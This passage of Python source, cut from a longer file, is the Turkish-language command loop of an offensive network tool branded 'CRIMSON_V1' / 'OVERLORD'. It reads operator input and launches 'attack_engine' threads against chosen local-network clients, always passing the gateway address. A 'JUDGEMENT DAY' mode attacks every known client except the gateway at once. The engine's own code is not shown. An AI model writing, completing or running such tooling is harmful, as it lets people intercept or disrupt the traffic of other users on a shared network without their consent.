        guide_table = Table(show_header=False, box=ROUNDED, border_style="grey37", expand=True)
        guide_table.add_row(f"{C}<ID> <MOD>", "Operasyonu Başlat", f"{Y}info <MOD>", "Detaylı Bilgi")
        guide_table.add_row(f"{C}<ID,ID> <MOD>", "Çoklu Hedef", f"{R}60 / 99", "JUDGEMENT DAY")
        if last_info: console.print(Panel(f"{W}{last_info}", title=f"{V}CRIMSON ASİSTAN", border_style="purple"))
        console.print(Panel(guide_table, title=f"{Y}[ OPERASYON ]", border_style="yellow"))
        cmd = console.input(f"\n{R}┌──({W}CRIMSON_V1{R})─[{V}OVERLORD{R}]\n└─{G}$ {W}").strip().lower()
        if cmd in ["0", "exit"]: break
        if cmd.startswith("info "):
            try: m_no = cmd.split()[1].zfill(2); last_info = MOD_DETAILS.get(m_no, "Geçersiz.")
            except: pass
            continue
        last_info = ""
        if cmd in ["99", "60"]:
            with clients_lock:
                for ip in known_clients:
                    if ip != gw and ip not in active_attacks:
                        stop_evt = threading.Event()
                        threading.Thread(target=attack_engine, args=(ip, gw, "1", stop_evt), daemon=True).start()
                        active_attacks[ip] = stop_evt; active_mods[ip] = ["JUDGEMENT"]
            continue
        try:
            parts = cmd.split()
            ids_str, mode = parts[0], parts[1]
            selected_indices = [int(i) for i in ids_str.split(",")]
            with clients_lock:
                ips = sorted(known_clients.keys())
                for idx in selected_indices:
                    target = ips[idx]
                    if target in active_attacks:
                        active_attacks[target].set(); del active_attacks[target]; active_mods[target] = []
                    else:
                        stop_evt = threading.Event()
                        threading.Thread(target=attack_engine, args=(target, gw, mode, stop_evt), daemon=True).start()
                        active_attacks[target] = stop_evt; active_mods[target] = [mode.upper()]
        except: continue

